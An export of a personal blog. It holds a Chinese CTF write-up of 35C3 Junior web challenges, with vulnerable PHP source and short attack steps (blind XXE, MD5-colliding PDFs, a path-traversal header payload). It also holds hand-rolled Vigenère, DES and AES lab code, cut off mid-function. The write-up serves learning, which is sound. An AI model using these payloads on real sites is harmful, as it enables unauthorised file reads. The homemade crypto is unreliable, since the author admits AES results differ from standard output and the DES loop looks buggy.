{"meta":{"title":"Altm4nz","subtitle":null,"description":null,"author":"Altm4nz","url":"http://altman.vip"},"pages":[{"title":"tags","date":"2018-11-02T05:28:06.000Z","updated":"2018-11-02T05:30:27.605Z","comments":true,"path":"tags/index.html","permalink":"http://altman.vip/tags/index.html","excerpt":"","text":""},{"title":"","date":"2018-11-02T04:52:01.000Z","updated":"2018-11-02T06:11:24.136Z","comments":false,"path":"about/index.html","permalink":"http://altman.vip/about/index.html","excerpt":"","text":"Altman -CUMTA WEB player from BXSEmail:872801413@qq.com"}],"posts":[{"title":"35c3_wp","slug":"35c3-wp","date":"2019-01-15T00:55:18.000Z","updated":"2019-01-15T03:42:13.778Z","comments":true,"path":"2019/01/15/35c3-wp/","link":"","permalink":"http://altman.vip/2019/01/15/35c3-wp/","excerpt":"","text":"Junior - web部分题目关了环境就没做了。 blind源码看过去应该是个反序列化 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php function __autoload($cls) &#123; include $cls; &#125; class Black &#123; public function __construct($string, $default, $keyword, $store) &#123; if ($string) ini_set(\"highlight.string\", \"#0d0d0d\"); if ($default) ini_set(\"highlight.default\", \"#0d0d0d\"); if ($keyword) ini_set(\"highlight.keyword\", \"#0d0d0d\"); if ($store) &#123; setcookie('theme', \"Black-\".$string.\"-\".$default.\"-\".$keyword, 0, '/'); &#125; &#125; &#125; class Green &#123; public function __construct($string, $default, $keyword, $store) &#123; if ($string) ini_set(\"highlight.string\", \"#00fb00\"); if ($default) ini_set(\"highlight.default\", \"#00fb00\"); if ($keyword) ini_set(\"highlight.keyword\", \"#00fb00\"); if ($store) &#123; setcookie('theme', \"Green-\".$string.\"-\".$default.\"-\".$keyword, 0, '/'); &#125; &#125; &#125; if ($_=@$_GET['theme']) &#123; if (in_array($_, [\"Black\", \"Green\"])) &#123; if (@class_exists($_)) &#123; ($string = @$_GET['string']) || $string = false; ($default = @$_GET['default']) || $default = false; ($keyword = @$_GET['keyword']) || $keyword = false; new $_($string, $default, $keyword, @$_GET['store']); &#125; &#125; &#125; else if ($_=@$_COOKIE['theme']) &#123; $args = explode('-', $_); if (class_exists($args[0])) &#123; new $args[0]($args[1], $args[2], $args[3], ''); &#125; &#125; else if ($_=@$_GET['info']) &#123; phpinfo(); &#125; highlight_file(__FILE__); Black和Green类好像都什么用。 注意到 1new $args[0]($args[1], $args[2], $args[3], ''); 这里args完全可控。 同时在phpinfo()中看到simplexml开启。 那么尝试blind xxe。结果直接报错抛出了值。 colliderpdf文件的MD5碰撞 先看源码 123456789101112131415161718192021&lt;?php include_once \"config.php\"; if(isset($_POST['submit'])) &#123; $pdf1 = $_FILES['pdf1']['tmp_name']; $pdf2 = $_FILES['pdf2']['tmp_name']; if(! strstr(shell_exec(\"pdftotext $pdf1 - | head -n 1 | grep -oP '^NO FLAG!$'\"), \"NO FLAG!\")) &#123; die(\"The first pdf does not contain 'NO FLAG!'\"); &#125; if(! strstr(shell_exec(\"pdftotext $pdf2 - | head -n 1 | grep -oP '^GIVE FLAG!$'\"), \"GIVE FLAG!\")) &#123; die(\"The second pdf does not contain 'GIVE FLAG!'\"); &#125; if(md5_file($pdf1) != md5_file($pdf2)) &#123; die(\"The MD5 hashes do not match!\"); &#125; echo \"$FLAG\"; &#125; 没找到什么绕过的方法 在github上找到这个项目 1https://github.com/corkami/pocs 首先生成两个带规定字符串得pdf文件 然后利用脚本生成拥有相同md5值的pdf文件 ps:需要安装mutool环境 1brew install mupdf-tools 然后提交上去就完事了 saltfish简单的审计题 123456789101112&lt;?php require_once('flag.php'); if ($_ = @$_GET['pass']) &#123; $ua = $_SERVER['HTTP_USER_AGENT']; if (md5($_) + $_[0] == md5($ua)) &#123; if ($_[0] == md5($_[0] . $flag)[0]) &#123; echo $flag; &#125; &#125; &#125; else &#123; highlight_file(__FILE__); &#125; _和ua使用相同的值绕过第一层if flag值不知道，但是可以推断出. $flag)[0]`的值为[0-f]12345678910111213141516171819202122232425262728那么简单的爆破就可以绕过了。## McDonald先发现泄露 /backup/.DS_Store利用工具恢复目录`https://github.com/lijiejie/ds_store_exp`然后看见flag.txt&lt;http://35.207.91.38/backup/b/a/c/flag.txt&gt; ## Flags```php&lt;?php highlight_file(__FILE__); $lang = $_SERVER[&apos;HTTP_ACCEPT_LANGUAGE&apos;] ?? &apos;ot&apos;; $lang = explode(&apos;,&apos;, $lang)[0]; $lang = str_replace(&apos;../&apos;, &apos;&apos;, $lang); $c = file_get_contents(&quot;flags/$lang&quot;); if (!$c) $c = file_get_contents(&quot;flags/ot&quot;); echo &apos;&lt;img src=&quot;data:image/jpeg;base64,&apos; . base64_encode($c) . &apos;&quot;&gt;&apos;; 简单的绕过一下 1Accept-Language: ..././..././..././..././..././..././flag 然后就结束了。。","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"密码学实验之手撸代码记录","slug":"密码学实验之手撸代码记录","date":"2019-01-02T11:52:28.000Z","updated":"2019-01-02T13:19:04.536Z","comments":true,"path":"2019/01/02/密码学实验之手撸代码记录/","link":"","permalink":"http://altman.vip/2019/01/02/密码学实验之手撸代码记录/","excerpt":"前言简单记录一下密码学实验的代码，不让使用引入包，写起来还挺麻烦的。","text":"前言简单记录一下密码学实验的代码，不让使用引入包，写起来还挺麻烦的。 古典密码古典密码只写了维吉尼亚 维吉尼亚12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# coding:utf-8# author:altman# Vigeneredef strlower(m): for i in range(0,len(m)): if( (ord(m[i])&lt;=90) &amp; (ord(m[i])&gt;=65) ): m = m[:i]+chr(ord(m[i])+32)+m[i+1:] return mdef encrypto(m,key): m = strlower(m) key = strlower(key) c='' lenm = len(m) lenk = len(key) turns = lenm / lenk Remaining = lenm % lenk for i in range(0,turns): for j in range(0,lenk): c += chr(int(((ord(m[i*lenk+j])-97)+(ord(key[j])-97))%26 +97)) for i in range(0,Remaining): c += chr(int(((ord(m[turns*lenk+i])-97)+(ord(key[i])-97))%26 +97)) return cdef decrypto(c,key): c = strlower(c) key = strlower(key) m = '' lenc =len(c) lenk = len(key) turns = lenc / lenk Remaining = lenc % lenk for i in range(0, turns): for j in range(0, lenk): m += chr(int(((ord(c[i * lenk + j]) - 97) - (ord(key[j]) - 97)) % 26 + 97)) for i in range(0, Remaining): m += chr(int(((ord(c[turns * lenk + i]) - 97) - (ord(key[i]) - 97)) % 26 + 97)) return mm='justatest'key = 'altman'c = encrypto(m,key) #jflfagedmprint cm = decrypto(c,key)print m 分组密码DES这个相对比较容易 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205# coding:utf-8# author:altman# DES#密文函数def ip(str): res='' ip_box = [58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56,48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37,29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7] for i in ip_box: res += str[i-1] return resdef _ip(str): x = \"\" box_ip = [40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25] for i in box_ip: x += str[i-1] return xdef e_box(str): e = [32,1,2,3,4,5,4,5,6,7,8,9,8,9,10,11,12,13,12,13,14,15,16,17,16,17,18,19,20,21,20,21,22,23,24,25,24,25,26,27,28,29,28,29,30,31,32,1] x = \"\" for i in e: x +=str[i-1] return xdef xor(str_a,str_b): x = \"\" len_str= len(str_a) for i in range(0,len_str): res = int(str_a[i])^int(str_b[i]) if res == 1: x +='1' else: x +='0' return xdef s_box(str): s = [[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7, 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8, 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0, 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13], [15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10, 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5, 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15, 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9], [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8, 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1, 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7, 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12], [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15, 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9, 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4, 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14], [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9, 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6, 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14, 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3], [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11, 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8, 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6, 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13], [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1, 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6, 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2, 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12], [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7, 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2, 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8, 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]] k = 0 x = '' for i in range(0,len(str),6): a = str[i:i+6] n = s[k][16*int((a[0]+a[5]),2)+int((a[1:5]),2)] n = bin(n)[2:] k += 1 while(4-len(n)): n = '0' + n x += n return xdef p_box(str): x = \"\" p = [16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25] for i in p: x +=str[i-1] return xdef F(str,key): e_res = e_box(str) xor_res = xor(e_res,key) s_res = s_box(xor_res) p_res = p_box(s_res) return p_res#密钥函数def pc_1(str): pc1 = [57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36,63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4] x = \"\" for i in pc1: x+=str[i-1] return xdef pc_2(str): pc2 = [14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,41,52,31,37,47,55,30,40,51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32] x = \"\" for i in pc2: x+=str[i-1] return xdef left(str,n): x = str[0:n] x = str[n:len(str)] + x return xdef key_16(str): key = pc_1(str) key_c = key[:28] key_d = key[28:] key_final=[] for i in range(0,16): k= i+1 if k in [1,2,9,16]: key_c = left(key_c, 1) key_d = left(key_d, 1) else: key_c = left(key_c, 2) key_d = left(key_d, 2) key_x = key_c + key_d key_x = pc_2(key_x) key_final.append(key_x) return key_finaldef str2bin(str): res = '' for i in str: x = bin(ord(i))[2:] for i in range(0,8-len(x)): x = '0' + x res += x return resdef bin2str(str): res = '' for i in range(0,len(str),8): x = str[i:i+8] x = int(x,2) res += chr(x) return resdef bin2hex(str): res = '' for i in range(0,len(str),8): x = str[i:i+8] x = int(x,2) res += chr(x) res = res.encode('hex') return resdef hex2bin(str): str = str.decode('hex') res = str2bin(str) return resdef encrypto(str,key):#输入字符串，返回16进制密文 c = '' k = 0 while(str[k:k+8]): m = str2bin(str[0:8]) m = ip(m) m_l = m[:32] m_r = m[32:] key = str2bin(key) key = key_16(key) for i in range(0, 15): tmp = m_r m_r = xor(m_l, F(m_r, key[i])) m_l = tmp m_l = xor(m_l, F(m_r, key[15])) m_final = m_l + m_r m_final = _ip(m_final) c += m_final c = bin2hex(c) k += 8 return cdef decrypto(str,key):#输入16进制密文，返回字符串明文 m = '' i = 0 while (str[i:i + 16]): c = hex2bin(str[i:i + 16]) key = str2bin(key) key = key_16(key) c = ip(c) c_l = c[:32] c_r = c[32:] for k in range(15,0,-1): tmp = c_r c_r = xor(c_l, F(c_r, key[k])) c_l = tmp c_l = xor(c_l, F(c_r, key[0])) c_final = c_l + c_r c_final = _ip(c_final) m += c_final i += 16 return bin2str(m)m='cumtcumt'key='altmannb'c='b171ccf168f7c7dd'print encrypto(m,key)print decrypto(c,key) AESaes写的我有点恶心，而且最后的加密结果和网上在线加密的不太一样，但是也实现了加密解密 至今未找到问题，有大佬发现了可以教我下。。。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788# coding:utf-8# author:altman# 伽罗华域以及一些转换函数def str2bin(str): res = '' for i in str: x = bin(ord(i))[2:] for i in range(0,8-len(x)): x = '0' + x res += x return resdef str2hex(str): res = '' for i in str: x = hex(ord(i))[2:] for i in range(0,2-len(x)): x = '0' + x res += x return res.upper()def hex2bin(str): str = str.decode('hex') res = str2bin(str) return resdef G2(str): str = hex2bin(str) str = str[1:len(str)]+'0' str = hex(int(str,2))[2:].upper() if len(str)!=2: for i in range(0,2-len(str)): str = '0'+str return strdef G4(str): str = hex2bin(str) str = str[2:len(str)]+'00' str = hex(int(str,2))[2:].upper() if len(str)!=2: for i in range(0,2-len(str)): str = '0'+str return strdef G8(str): str = hex2bin(str) str = str[3:len(str)]+'000' str = hex(int(str,2))[2:].upper() if len(str)!=2: for i in range(0,2-len(str)): str = '0'+str return strdef G(str1,str2): if str1 == \"01\": return str2.upper() elif str1 == \"02\": return G2(str2) elif str1 == \"03\": tmp = hex(int(G2(str2),16)^int(str2,16))[2:] if len(tmp) != 2: for i in range(0, 2 - len(tmp)): tmp = '0' + tmp return tmp.upper() elif str1 == \"09\": tmp = hex(int(G8(str2), 16) ^ int(str2, 16))[2:] if len(tmp) != 2: for i in range(0, 2 - len(tmp)): tmp = '0' + tmp return tmp.upper() elif str1 == \"0B\": tmp = hex(int(G8(str2), 16) ^ int(G2(str2), 16)^int(str2, 16))[2:] if len(tmp) != 2: for i in range(0, 2 - len(tmp)): tmp = '0' + tmp return tmp.upper() elif str1 == \"0D\": tmp = hex(int(G8(str2), 16) ^ int(G4(str2), 16) ^ int(str2, 16))[2:] if len(tmp) != 2: for i in range(0, 2 - len(tmp)): tmp = '0' + tmp return tmp.upper() elif str1 == \"0E\": tmp = hex(int(G8(str2), 16) ^ int(G4(str2), 16) ^ int(G2(str2), 16))[2:] if len(tmp) != 2: for i in range(0, 2 - len(tmp)): tmp = '0' + tmp return tmp.upper() 下面是主函数，需要import上面的文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208# coding:utf-8# author:altman# AES (len(key)==128 &amp; turn==10)from galois import *# 字节代换def S_box(str): x = \"\" s = &#123;\"00\":\"63\",\"01\":\"7C\",\"02\":\"77\",\"03\":\"7B\",\"04\":\"F2\",\"05\":\"6B\",\"06\":\"6F\",\"07\":\"C5\",\"08\":\"30\",\"09\":\"01\",\"0A\":\"67\",\"0B\":\"2B\",\"0C\":\"FE\",\"0D\":\"D7\",\"0E\":\"AB\",\"0F\":\"76\",\"10\":\"CA\",\"11\":\"82\",\"12\":\"C9\",\"13\":\"7D\",\"14\":\"FA\",\"15\":\"59\",\"16\":\"47\",\"17\":\"F0\",\"18\":\"AD\",\"19\":\"D4\",\"1A\":\"A2\",\"1B\":\"AF\",\"1C\":\"9C\",\"1D\":\"A4\",\"1E\":\"72\",\"1F\":\"C0\",\"20\":\"B7\",\"21\":\"FD\",\"22\":\"93\",\"23\":\"26\",\"24\":\"36\",\"25\":\"3F\",\"26\":\"F7\",\"27\":\"CC\",\"28\":\"34\",\"29\":\"A5\",\"2A\":\"E5\",\"2B\":\"F1\",\"2C\":\"71\",\"2D\":\"D8\",\"2E\":\"31\",\"2F\":\"15\",\"30\":\"04\",\"31\":\"C7\",\"32\":\"23\",\"33\":\"C3\",\"34\":\"18\",\"35\":\"96\",\"36\":\"05\",\"37\":\"9A\",\"38\":\"07\",\"39\":\"12\",\"3A\":\"80\",\"3B\":\"E2\",\"3C\":\"EB\",\"3D\":\"27\",\"3E\":\"B2\",\"3F\":\"75\",\"40\":\"09\",\"41\":\"83\",\"42\":\"2C\",\"43\":\"1A\",\"44\":\"1B\",\"45\":\"6E\",\"46\":\"5A\",\"47\":\"A0\",\"48\":\"52\",\"49\":\"3B\",\"4A\":\"D6\",\"4B\":\"B3\",\"4C\":\"29\",\"4D\":\"E3\",\"4E\":\"2F\",\"4F\":\"84\",\"50\":\"53\",\"51\":\"D1\",\"52\":\"00\",\"53\":\"ED\",\"54\":\"20\",\"55\":\"FC\",\"56\":\"B1\",\"57\":\"5B\",\"58\":\"6A\",\"59\":\"CB\",\"5A\":\"BE\",\"5B\":\"39\",\"5C\":\"4A\",\"5D\":\"4C\",\"5E\":\"58\",\"5F\":\"CF\",\"60\":\"D0\",\"61\":\"EF\",\"62\":\"AA\",\"63\":\"FB\",\"64\":\"43\",\"65\":\"4D\",\"66\":\"33\",\"67\":\"85\",\"68\":\"45\",\"69\":\"F9\",\"6A\":\"02\",\"6B\":\"7F\",\"6C\":\"50\",\"6D\":\"3C\",\"6E\":\"9F\",\"6F\":\"A8\",\"70\":\"51\",\"71\":\"A3\",\"72\":\"40\",\"73\":\"8F\",\"74\":\"92\",\"75\":\"9D\",\"76\":\"38\",\"77\":\"F5\",\"78\":\"BC\",\"79\":\"B6\",\"7A\":\"DA\",\"7B\":\"21\",\"7C\":\"10\",\"7D\":\"FF\",\"7E\":\"F3\",\"7F\":\"D2\",\"80\":\"CD\",\"81\":\"0C\",\"82\":\"13\",\"83\":\"EC\",\"84\":\"5F\",\"85\":\"97\",\"86\":\"44\",\"87\":\"17\",\"88\":\"C4\",\"89\":\"A7\",\"8A\":\"7E\",\"8B\":\"3D\",\"8C\":\"64\",\"8D\":\"5D\",\"8E\":\"19\",\"8F\":\"73\",\"90\":\"60\",\"91\":\"81\",\"92\":\"4F\",\"93\":\"DC\",\"94\":\"22\",\"95\":\"2A\",\"96\":\"90\",\"97\":\"88\",\"98\":\"46\",\"99\":\"EE\",\"9A\":\"B8\",\"9B\":\"14\",\"9C\":\"DE\",\"9D\":\"5E\",\"9E\":\"0B\",\"9F\":\"DB\",\"A0\":\"E0\",\"A1\":\"32\",\"A2\":\"3A\",\"A3\":\"0A\",\"A4\":\"49\",\"A5\":\"06\",\"A6\":\"24\",\"A7\":\"5C\",\"A8\":\"C2\",\"A9\":\"D3\",\"AA\":\"AC\",\"AB\":\"62\",\"AC\":\"91\",\"AD\":\"95\",\"AE\":\"E4\",\"AF\":\"79\",\"B0\":\"E7\",\"B1\":\"C8\",\"B2\":\"37\",\"B3\":\"6D\",\"B4\":\"8D\",\"B5\":\"D5\",\"B6\":\"4E\",\"B7\":\"A9\",\"B8\":\"6C\",\"B9\":\"56\",\"BA\":\"F4\",\"BB\":\"EA\",\"BC\":\"65\",\"BD\":\"7A\",\"BE\":\"AE\",\"BF\":\"08\",\"C0\":\"BA\",\"C1\":\"78\",\"C2\":\"25\",\"C3\":\"2E\",\"C4\":\"1C\",\"C5\":\"A6\",\"C6\":\"B4\",\"C7\":\"C6\",\"C8\":\"E8\",\"C9\":\"DD\",\"CA\":\"74\",\"CB\":\"1F\",\"CC\":\"4B\",\"CD\":\"BD\",\"CE\":\"8B\",\"CF\":\"8A\",\"D0\":\"70\",\"D1\":\"3E\",\"D2\":\"B5\",\"D3\":\"66\",\"D4\":\"48\",\"D5\":\"03\",\"D6\":\"F6\",\"D7\":\"0E\",\"D8\":\"61\",\"D9\":\"35\",\"DA\":\"57\",\"DB\":\"B9\",\"DC\":\"86\",\"DD\":\"C1\",\"DE\":\"1D\",\"DF\":\"9E\",\"E0\":\"E1\",\"E1\":\"F8\",\"E2\":\"98\",\"E3\":\"11\",\"E4\":\"69\",\"E5\":\"D9\",\"E6\":\"8E\",\"E7\":\"94\",\"E8\":\"9B\",\"E9\":\"1E\",\"EA\":\"87\",\"EB\":\"E9\",\"EC\":\"CE\",\"ED\":\"55\",\"EE\":\"28\",\"EF\":\"DF\",\"F0\":\"8C\",\"F1\":\"A1\",\"F2\":\"89\",\"F3\":\"0D\",\"F4\":\"BF\",\"F5\":\"E6\",\"F6\":\"42\",\"F7\":\"68\",\"F8\":\"41\",\"F9\":\"99\",\"FA\":\"2D\",\"FB\":\"0F\",\"FC\":\"B0\",\"FD\":\"54\",\"FE\":\"BB\",\"FF\":\"16\"&#125; for i in range(0,len(str),2): x += s[str[i:i+2]] return xdef _S_box(str): x = \"\" s = &#123;\"00\":\"52\",\"01\":\"09\",\"02\":\"6A\",\"03\":\"D5\",\"04\":\"30\",\"05\":\"36\",\"06\":\"A5\",\"07\":\"38\",\"08\":\"BF\",\"09\":\"40\",\"0A\":\"A3\",\"0B\":\"9E\",\"0C\":\"81\",\"0D\":\"F3\",\"0E\":\"D7\",\"0F\":\"FB\",\"10\":\"7C\",\"11\":\"E3\",\"12\":\"39\",\"13\":\"82\",\"14\":\"9B\",\"15\":\"2F\",\"16\":\"FF\",\"17\":\"87\",\"18\":\"34\",\"19\":\"8E\",\"1A\":\"43\",\"1B\":\"44\",\"1C\":\"C4\",\"1D\":\"DE\",\"1E\":\"E9\",\"1F\":\"CB\",\"20\":\"54\",\"21\":\"7B\",\"22\":\"94\",\"23\":\"32\",\"24\":\"A6\",\"25\":\"C2\",\"26\":\"23\",\"27\":\"3D\",\"28\":\"EE\",\"29\":\"4C\",\"2A\":\"95\",\"2B\":\"0B\",\"2C\":\"42\",\"2D\":\"FA\",\"2E\":\"C3\",\"2F\":\"4E\",\"30\":\"08\",\"31\":\"2E\",\"32\":\"A1\",\"33\":\"66\",\"34\":\"28\",\"35\":\"D9\",\"36\":\"24\",\"37\":\"B2\",\"38\":\"76\",\"39\":\"5B\",\"3A\":\"A2\",\"3B\":\"49\",\"3C\":\"6D\",\"3D\":\"8B\",\"3E\":\"D1\",\"3F\":\"25\",\"40\":\"72\",\"41\":\"F8\",\"42\":\"F6\",\"43\":\"64\",\"44\":\"86\",\"45\":\"68\",\"46\":\"98\",\"47\":\"16\",\"48\":\"D4\",\"49\":\"A4\",\"4A\":\"5C\",\"4B\":\"CC\",\"4C\":\"5D\",\"4D\":\"65\",\"4E\":\"B6\",\"4F\":\"92\",\"50\":\"6C\",\"51\":\"70\",\"52\":\"48\",\"53\":\"50\",\"54\":\"FD\",\"55\":\"ED\",\"56\":\"B9\",\"57\":\"DA\",\"58\":\"5E\",\"59\":\"15\",\"5A\":\"46\",\"5B\":\"57\",\"5C\":\"A7\",\"5D\":\"8D\",\"5E\":\"9D\",\"5F\":\"84\",\"60\":\"90\",\"61\":\"D8\",\"62\":\"AB\",\"63\":\"00\",\"64\":\"8C\",\"65\":\"BC\",\"66\":\"D3\",\"67\":\"0A\",\"68\":\"F7\",\"69\":\"E4\",\"6A\":\"58\",\"6B\":\"05\",\"6C\":\"B8\",\"6D\":\"B3\",\"6E\":\"45\",\"6F\":\"06\",\"70\":\"D0\",\"71\":\"2C\",\"72\":\"1E\",\"73\":\"8F\",\"74\":\"CA\",\"75\":\"3F\",\"76\":\"0F\",\"77\":\"02\",\"78\":\"C1\",\"79\":\"AF\",\"7A\":\"BD\",\"7B\":\"03\",\"7C\":\"01\",\"7D\":\"13\",\"7E\":\"8A\",\"7F\":\"6B\",\"80\":\"3A\",\"81\":\"91\",\"82\":\"11\",\"83\":\"41\",\"84\":\"4F\",\"85\":\"67\",\"86\":\"DC\",\"87\":\"EA\",\"88\":\"97\",\"89\":\"F2\",\"8A\":\"CF\",\"8B\":\"CE\",\"8C\":\"F0\",\"8D\":\"B4\",\"8E\":\"E6\",\"8F\":\"73\",\"90\":\"96\",\"91\":\"AC\",\"92\":\"74\",\"93\":\"22\",\"94\":\"E7\",\"95\":\"AD\",\"96\":\"35\",\"97\":\"85\",\"98\":\"E2\",\"99\":\"F9\",\"9A\":\"37\",\"9B\":\"E8\",\"9C\":\"1C\",\"9D\":\"75\",\"9E\":\"DF\",\"9F\":\"6E\",\"A0\":\"47\",\"A1\":\"F1\",\"A2\":\"1A\",\"A3\":\"71\",\"A4\":\"1D\",\"A5\":\"29\",\"A6\":\"C5\",\"A7\":\"89\",\"A8\":\"6F\",\"A9\":\"B7\",\"AA\":\"62\",\"AB\":\"0E\",\"AC\":\"AA\",\"AD\":\"18\",\"AE\":\"BE\",\"AF\":\"1B\",\"B0\":\"FC\",\"B1\":\"56\",\"B2\":\"3E\",\"B3\":\"4B\",\"B4\":\"C6\",\"B5\":\"D2\",\"B6\":\"79\",\"B7\":\"20\",\"B8\":\"9A\",\"B9\":\"DB\",\"BA\":\"C0\",\"BB\":\"FE\",\"BC\":\"78\",\"BD\":\"CD\",\"BE\":\"5A\",\"BF\":\"F4\",\"C0\":\"1F\",\"C1\":\"DD\",\"C2\":\"A8\",\"C3\":\"33\",\"C4\":\"88\",\"C5\":\"07\",\"C6\":\"C7\",\"C7\":\"31\",\"C8\":\"B1\",\"C9\":\"12\",\"CA\":\"10\",\"CB\":\"59\",\"CC\":\"27\",\"CD\":\"80\",\"CE\":\"EC\",\"CF\":\"5F\",\"D0\":\"60\",\"D1\":\"51\",\"D2\":\"7F\",\"D3\":\"A9\",\"D4\":\"19\",\"D5\":\"B5\",\"D6\":\"4A\",\"D7\":\"0D\",\"D8\":\"2D\",\"D9\":\"E5\",\"DA\":\"7A\",\"DB\":\"9F\",\"DC\":\"93\",\"DD\":\"C9\",\"DE\":\"9C\",\"DF\":\"EF\",\"E0\":\"A0\",\"E1\":\"E0\",\"E2\":\"3B\",\"E3\":\"4D\",\"E4\":\"AE\",\"E5\":\"2A\",\"E6\":\"F5\",\"E7\":\"B0\",\"E8\":\"C8\",\"E9\":\"EB\",\"EA\":\"BB\",\"EB\":\"3C\",\"EC\":\"83\",\"ED\":\"53\",\"EE\":\"99\",\"EF\":\"61\",\"F0\":\"17\",\"F1\":\"2B\",\"F2\":\"04\",\"F3\":\"7E\",\"F4\":\"BA\",\"F5\":\"77\",\"F6\":\"D6\",\"F7\":\"26\",\"F8\":\"E1\",\"F9\":\"69\",\"FA\":\"14\",\"FB\":\"63\",\"FC\":\"55\",\"FD\":\"21\",\"FE\":\"0C\",\"FF\":\"7D\"&#125; for i in range(0, len(str), 2): x += s[str[i:i+2]] return x#行移位def move(str): x = '' j=0 for i in range(0,len(str),8): x += (str[i+j*2:i+8]+str[i:i+j*2]) if j == 3: j = 0 else: j += 1 return xdef _move(str): x = '' j=0 for i in range(0,len(str),8): x += (str[i+(8-j*2):i+8]+str[i:i+(8-j*2)]) if j == 3: j = 0 else: j += 1 return xdef str2bin(str): res = '' for i in str: x = bin(ord(i))[2:] for i in range(0,8-len(x)): x = '0' + x res += x return resdef hex2bin(str): str = str.decode('hex') res = str2bin(str) return res#列混合def str2matrix(str):#转矩阵 matrix = [[0 for i in range(4)] for i in range(4)] for i in range(0,4): for j in range(0,4): matrix[i][j] = str[(i*4+j)*2:(i*4+j)*2+2] return matrixdef mix(str): col = [[\"02\", \"03\", \"01\", \"01\"], [\"01\", \"02\", \"03\", \"01\"], [\"01\", \"01\", \"02\", \"03\"], [\"03\", \"01\", \"01\", \"02\"]] s = str2matrix(str) res = \"\" for i in range(0,len(s)): #i是行 j是列 for j in range(0,len(s[i])): tmp_ascii = 0x00 for n in range(0,len(s[i])): tmp_ascii = tmp_ascii^int(G(col[i][n],s[n][j]),16) tmp = hex(tmp_ascii)[2:] if len(tmp) != 2: for sb in range(0, 2 - len(tmp)): tmp = \"0\" + tmp res += tmp return res.upper()def _mix(str): col = [[\"0E\", \"0B\", \"0D\", \"09\"], [\"09\", \"0E\", \"0B\", \"0D\"], [\"0D\", \"09\", \"0E\", \"0B\"], [\"0B\", \"0D\", \"09\", 